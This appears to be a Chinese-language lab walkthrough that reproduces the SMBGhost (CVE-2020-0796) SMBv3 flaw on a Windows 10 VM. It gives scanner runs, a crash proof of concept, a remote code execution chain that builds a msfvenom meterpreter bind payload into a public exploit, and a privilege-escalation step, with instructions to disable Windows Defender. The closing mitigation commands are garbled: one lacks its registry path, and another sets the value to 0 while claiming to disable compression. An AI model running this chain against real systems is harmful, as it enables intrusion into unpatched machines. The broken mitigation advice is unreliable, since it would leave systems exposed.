## 前言

Microsoft 服务器消息块 3.1.1 (SMBv3)
协议处理某些请求的方式中存在远程执行代码漏洞。成功利用此漏洞的攻击者可以获取在目标服务器或客户端上执行代码的能力。

## 漏洞影响版本

漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。

![](https://image.3001.net/images/20210525/1621957585_60ad1bd17f064be7b6858.png!small)

## 实验环境

![](https://image.3001.net/images/20210525/1621957942_60ad1d36df3dd8e076563.png!small)

## 准备

打开Win10虚拟打开控制面板，关闭防![image-20210512231916109.png](https://image.3001.net/images/20210525/1621955814_60ad14e632e187e2e367d.png!small)

暂停windows自动更新

![image-20210514225750183.png](https://image.3001.net/images/20210525/1621955815_60ad14e75ee21d1f0f296.png!small)

## 查看本机IP

C:\Users\zeeker>ipconfig

Windows IP 配置

以太网适配器 Ethernet0:

连接特定的 DNS 后缀 . . . . . . . : localdomain

本地链接 IPv6 地址. . . . . . . . : fe80::f13b:b0d2:f5f8:f1f0%12

IPv4 地址 . . . . . . . . . . . . : 192.168.50.139

子网掩码 . . . . . . . . . . . . : 255.255.255.0

默认网关. . . . . . . . . . . . . : 192.168.50.2

C:\Users\zeeker>

## 验证是否存在漏洞

1.下载监测脚本

<https://github.com/ollypwn/SMBGhost>

2.运行

root@kali:~/Desktop/漏洞复现/CVE-2020-0796# python3 scanner.py 192.168.50.134

192.168.50.134 Vulnerable

显示存在该漏洞，继续测试，但这个检测脚本不太靠谱，有时候超时也会判定为存在漏洞，如果打了补丁的系统也可能会显示存在漏洞

3.使用奇安信开发的检测工具

<http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip>

扫原本被SMBGhost判定为Vulnerable的192.168.50.134

![image-20210513013833447.png](https://image.3001.net/images/20210525/1621955816_60ad14e8cb377d71e2e7d.png!small)

换上未修复漏洞的1903版本的Win10

![image-20210513141139309.png](https://image.3001.net/images/20210525/1621955817_60ad14e99a451f34c6e76.png!small)

## 蓝屏验证

![](https://image.3001.net/images/20210525/1621957890_60ad1d02139583e5b6e64.png!small)

### 小坑

    
    
    ### 如果遇到以下错误
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC# python3 CVE-2020-0796.py 192.168.50.139
    
    Traceback (most recent call last):
    
    File "CVE-2020-0796.py", line 3, in <module>
    
    from smbclient import (
    
    File "/root/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC/smbclient/__init__.py", line 7, in <module>
    
    from smbclient._pool import (
    
    File "/root/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC/smbclient/_pool.py", line 14, in <module>
    
    from smbprotocol.session import (
    
    File "/root/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC/smbprotocol/session.py", line 25, in <module>
    
    from ntlm_auth.ntlm import (
    
    ImportError: cannot import name 'NtlmContext' from 'ntlm_auth.ntlm' (/usr/lib/python3/dist-packages/ntlm_auth/ntlm.py)
    
    ### 这是由于 ntlm_auth 版本低了，更新一下就好了
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC# pip3 install --upgrade ntlm-auth
    
    Looking in indexes: https://mirrors.aliyun.com/pypi/simple/
    
    Requirement already satisfied: ntlm-auth in /usr/lib/python3/dist-packages (1.1.0)
    
    Collecting ntlm-auth
    
    Downloading https://mirrors.aliyun.com/pypi/packages/ff/84/97c550164b54942b0e908c31ef09d9469f3ba4cd7332a671e2125732f63b/ntlm_auth-1.5.0-py2.py3-none-any.whl (29 kB)
    
    Installing collected packages: ntlm-auth
    
    Attempting uninstall: ntlm-auth
    
    Found existing installation: ntlm-auth 1.1.0
    
    Uninstalling ntlm-auth-1.1.0:
    
    Successfully uninstalled ntlm-auth-1.1.0
    
    Successfully installed ntlm-auth-1.5.0
    
    WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC#

## 蓝屏测试

> root@kali:~/Desktop/漏洞复现/CVE-2020-0796/CVE-2020-0796-PoC# python3
> CVE-2020-0796.py 192.168.50.139

![image-20210514214705871.png](https://image.3001.net/images/20210525/1621955818_60ad14ea7720d8dd7c697.png!small)

## 远程代码执行

记得先把Defender全关掉或者卸掉

![image-20210514224901658.png](https://image.3001.net/images/20210525/1621955819_60ad14eb9035ec2b6a303.png!small)

下载EXP，<https://github.com/eerykitty/CVE-2020-0796-PoC>

替换payload

    
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/SMBGhost_RCE_PoC# msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f py -o payload
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    
    [-] No arch selected, selecting arch: x64 from the payload
    
    Payload size: 496 bytes
    
    Final size of py file: 2424 bytes
    
    Saved as: payload
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/SMBGhost_RCE_PoC#

然后把下载的 **exploit.py** 里的 **USER_PAYLOAD** 部分替换成msfvenom生成的payload

开MSF，跑脚本

    
    
    root@kali:~# msfconsole
    
    ......
    
    ### Another Terminal
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/SMBGhost_RCE_PoC# python3 exploit.py -ip 192.168.50.139
    
    [+] found low stub at phys addr 13000!
    
    [+] PML4 at 1ad000
    
    [+] base of HAL heap at fffff79c40000000
    
    [+] found PML4 self-ref entry 1e6
    
    [+] found HalpInterruptController at fffff79c40001478
    
    [+] found HalpApicRequestInterrupt at fffff807540b3bb0
    
    [+] built shellcode!
    
    [+] KUSER_SHARED_DATA PTE at fffff37bc0000000
    
    [+] KUSER_SHARED_DATA PTE NX bit cleared!
    
    [+] Wrote shellcode at fffff78000000950!
    
    [+] Press a key to execute shellcode!
    
    [+] overwrote HalpInterruptController pointer, should have execution shortly...
    
    root@kali:~/Desktop/漏洞复现/CVE-2020-0796/SMBGhost_RCE_PoC#

### 小坑

    
    
    ### 如果遇到以下错误
    
    [-] physical read primitive failed!
    
    ### 不是漏洞被修复了就是没关WindowsDefender就是关了WindowsDefender重启虚拟机又自动开了实时保护

### 继续

![image-20210514224642218.png](https://image.3001.net/images/20210525/1621955821_60ad14edd07b4bca87696.png!small)

![image-20210514224739472.png](https://image.3001.net/images/20210525/1621955827_60ad14f3b7251f37e08b1.png!small)

稳定不蓝屏，整挺好

## 本地提权

提权POC

<https://github.com/ZecOps/CVE-2020-0796-LPE-POC>

已编译EXP

<https://github.com/f1tz/CVE-2020-0796-LPE-EXP>

要跑这个程序肯定要先把Windows自带的Defender关掉，不然会直接吞掉这个提权程序

然后直接跑起来就能弹一个system权限的命令窗口了

![image-20210513144450703.png](https://image.3001.net/images/20210525/1621955833_60ad14f9010c4e65c7bf5.png!small)

# 修复建议

（参考微软官方建议，<https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796>）

 **1.更新系统**

这肯定是最常见也是最简单有效的方法了

 **2.禁用 SMBv3 压缩**

可以使用以下 PowerShell 命令禁用压缩功能，以阻止未经身份验证的攻击者利用 **SMBv3 服务器** 的漏洞。

Set-ItemProperty -Path

DisableCompression -Type DWORD -Value 1 -Force

### 注意：

1.进行更改后，无需重启

2.此解决方法不能阻止利用 SMB 客户端；尝试第二种方法以保护客户端

3.Windows 或 Windows Server 尚未使用 SMB 压缩，并且禁用 SMB 压缩不会产生负面的性能影响

可以使用下面的 PowerShell 命令禁用该功能

    
    
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 0 -Force

**注意：**禁用此功能后，无需重启。

